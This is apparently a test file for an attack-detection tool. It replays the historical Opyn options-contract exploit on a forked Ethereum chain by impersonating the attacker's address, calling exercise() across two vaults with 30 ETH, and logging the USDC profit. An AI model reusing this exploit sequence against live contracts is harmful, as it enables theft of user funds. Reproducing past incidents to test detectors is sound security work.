import { ethers } from 'hardhat'
import { IERC20, OpynInterface } from '../typechain-types'
import { expect } from 'chai'

describe('CCA Detects Opyn Test', async function () {
    let attacker: string
    let opyn: OpynInterface
    let USDCTokenAddress: string
    let USDCToken: IERC20

    beforeEach(async () => {
        opyn = await ethers.getContractAt('OpynInterface', '0x951D51bAeFb72319d9FBE941E1615938d89ABfe2')
        expect(await opyn.getAddress()).to.equal('0x951D51bAeFb72319d9FBE941E1615938d89ABfe2')
        USDCTokenAddress = ethers.getAddress('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48')
        USDCToken = await ethers.getContractAt('IERC20', USDCTokenAddress)
    })

    it('should block number equal to 10592516', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(10_592_516)
    })

    it('should simulate the attack on Opyn', async function () {
        attacker = '0xe7870231992Ab4b1A01814FA0A599115FE94203f'

        await hre.network.provider.request({
            method: 'hardhat_impersonateAccount',
            params: [attacker],
        })

        const impersonatedSigner = await ethers.getSigner(attacker)

        let balanceBefore = await USDCToken.balanceOf(attacker)
        console.log('Attacker USDC balance before is     ', balanceBefore.toString())

        let amtToCreate = 300000000
        let amtCollateral = 9900000000

        const tx = await opyn.connect(impersonatedSigner).addERC20CollateralOption(amtToCreate, amtCollateral, attacker)
        await tx.wait()

        const vaultAddresses = [
            '0xe7870231992Ab4b1A01814FA0A599115FE94203f',
            '0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2',
        ]

        const vaultsPayable = vaultAddresses.map((addr) => ethers.getAddress(addr))

        const tx2 = await opyn
            .connect(impersonatedSigner)
            .exercise(600_000_000, vaultsPayable, { value: ethers.parseEther('30') })

        await tx2.wait()

        const tx3 = await opyn.connect(impersonatedSigner).removeUnderlying()
        await tx3.wait()

        let balanceAfter = await USDCToken.balanceOf(attacker)
        console.log('Attacker USDC balance after is     ', balanceAfter.toString())
        console.log('Attacker profit is                  ', balanceAfter - balanceBefore)
    })
})
